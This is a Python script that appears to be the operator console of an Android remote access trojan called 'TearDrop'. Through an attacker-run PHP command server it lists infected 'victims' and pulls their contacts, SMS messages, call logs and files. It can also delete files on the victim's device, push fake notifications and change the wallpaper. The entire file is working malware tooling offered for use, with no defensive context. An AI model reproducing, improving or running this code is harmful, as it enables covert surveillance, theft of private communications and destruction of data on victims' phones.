import requests
import os, threading,sys
import time
import urllib


def slave():
    URL = url + ("/slave.php")
    response = urllib.urlopen(URL)
    data = response.read()
    hel = data.replace('<br>', '\n')
    print ("USERID  VICTIM_IP\n_________________\n\n") + hel
def getuserip():
        URL = url + ("/userip.php")
        response = urllib.urlopen(URL)
        data = response.read()
        return data

print """
_________________________________________________________________________________
______________________           ________                                       |
\__    ___/\_   _____/____ ______\______ \_______  ____ ______                  |
  |    |    |    __)_\__  \\_  __ \    |  \_  __ \/  _ \\____ \                   |
  |    |    |        \/ __ \|  | \/    `   \  | \(  <_> )  |_> >                |
  |____|   /_______  (____  /__| /_______  /__|   \____/|   __/                 |
                   \/     \/             \/             |__|Coded by:ScRipt1337 |
DOnt forget to like our facebook page for updates and more tools                |
                                      https://www.facebook.com/script1337       |
________________________________________________________________________________|                                                
"""

url = raw_input("\nEnter your website url here = ")
print "User ip: "+getuserip()+ "\nType help to get all command list"

def loading():
    n = 100
    for i in range(n):
        time.sleep(0.500)
        sys.stdout.write(
            '\r' + 'loading...  process ' + str(i) + '/' + str(n)+ '%')
        sys.stdout.flush()
    sys.stdout.write('\r' + 'loading... finished               \n')

def get_platform():
    platforms = {
        'linux1': 'Linux',
        'linux2': 'Linux',
        'win32': 'Windows'
    }
    if sys.platform not in platforms:
        return sys.platform

    return platforms[sys.platform]

def help():
    print """
    commands results
    
    ls       list of all victims
    set      set target ex : set 1234        (1234 = target userid)
    getcon   get all contacts from user android device
    getsms   get all sms from user android device
    getcalllogs  get all call history
    getfileloc   get all files path
	getfile      Downlaod any file from victim device
	sendnoti     send fake notification to victim
	delelet      delelet any file from victim device
	chngwal      change victim wallpaper
    """

def getcon():
    id = raw_input("Please Enter victim id = ")
    link = url + "/addcommand.php?id=" + id + "&command=con"
    r = requests.get(link)
    print (r.text)
    loading()
    response = urllib.urlopen(url+"/slavcon.php?id="+id+"alcon")
    data = response.read()
    hel = data.replace('<br>', '\n')
    print(hel)

def getsms():
    id = raw_input("Please Enter victim id = ")
    link = url + "/addcommand.php?id=" + id + "&command=smlg"
    r = requests.get(link)
    print (r.text)
    loading()
    response = urllib.urlopen(url+"/slavesms.php?id="+id+"smsogs")
    data = response.read()
    hel = data.replace('<br>', '\n')
    print(hel)

def callog():
    id = raw_input("Please Enter victim id = ")
    link = url + "/addcommand.php?id=" + id + "&command=cllg"
    r = requests.get(link)
    print (r.text)
    loading()
    response = urllib.urlopen(url+"/cllg.php?id="+id+"calllogs")
    data = response.read()
    hel = data.replace('<br>', '\n')
    print(hel)

def getfileloc():
    id = raw_input("Please Enter victim id = ")
    print ("Type 1 if you want files from Internal storage")
    print ("Type 2 if you want files from External storage")
    he = raw_input("Choose any one of them = ")
    if he == "1":
        link = url + "/addcommand.php?id=" + id + "&command=infe"
        r = requests.get(link)
        print (r.text)
        loading()
        response = urllib.urlopen(url + "/getfileloc.php?id=" + id + "file")
        data = response.read()
        hel = data.replace('<br>', '\n')
        print(hel)
    elif he == "2":
        link = url + "/addcommand.php?id=" + id + "&command=sdfe"
        r = requests.get(link)
        print (r.text)
        loading()
        response = urllib.urlopen(url + "/getfileloc.php?id=" + id + "file")
        data = response.read()
        hel = data.replace('<br>', '\n')
        print(hel)
    else:
        print ("Wrong choice")


def getfile():
    id = raw_input("Please Enter victim id = ")
    vicp = raw_input("\ntype getfileloc if you dont know the files path \nPlease Enter the file path = ")
    ds = url + "/injectfile.php?command=" + vicp
    f = requests.get(ds)
    print (f.text)
    link = url + "/addcommand.php?id=" + id + "&command=upld"
    r = requests.get(link)
    print (r.text)
    loading()
    cwd = os.getcwd()
    urllib.urlretrieve(url + "/upload/"+os.path.basename(vicp), cwd +"\\"+os.path.basename(vicp))
    print("DOwnloaded files location "+cwd +"\\"+os.path.basename(vicp))
def sendnoti():
    id = raw_input("Please Enter victim id = ")
    vicp = raw_input("Enter what you want to show in notification = ")
    ds = url + "/injectfile.php?command=" + vicp
    f = requests.get(ds)
    link = url + "/addcommand.php?id=" + id + "&command=nofi"
    r = requests.get(link)
    print (r.text)
    print (f.text)
    print ("Notication send successfully dude!!!")

def delelet():
    id = raw_input("Please Enter victim id = ")
    vicp = raw_input("\nType getfileloc if you dont know the files path \nPlease Enter the file path = ")
    ds = url + "/injectfile.php?command=" + vicp
    f = requests.get(ds)
    print (f.text)
    link = url + "/addcommand.php?id=" + id + "&command=del"
    r = requests.get(link)
    print (r.text)
    print ("file successfully delete buddy!!!")
def chngwal():
    id = raw_input("Please Enter victim id = ")
    link = url + "/addcommand.php?id=" + id + "&command=chwl"
    r = requests.get(link)
    print (r.text)

def start():
    while True:
        cmd = raw_input("hacker> ")
        if cmd == 'ls':
            slave()
            continue
        elif 'help' in cmd:
            help()
            continue
        elif 'quit' in cmd:
            sys.exit()
        elif 'getcon' in cmd:
            getcon()
            continue
        elif 'getsms' in cmd:
            getsms()
        elif 'getcalllogs' in cmd:
            callog()
        elif 'getfileloc' in cmd:
            getfileloc()
        elif 'getfile' in cmd:
            getfile()
        elif 'sendnoti' in cmd:
            sendnoti()
        elif 'delelet' in cmd:
            delelet()
        elif 'change' in cmd:
            chngwal()
        else:
            print "command not found :( "

t = threading.Thread(target=start(), name='start')
t.start()



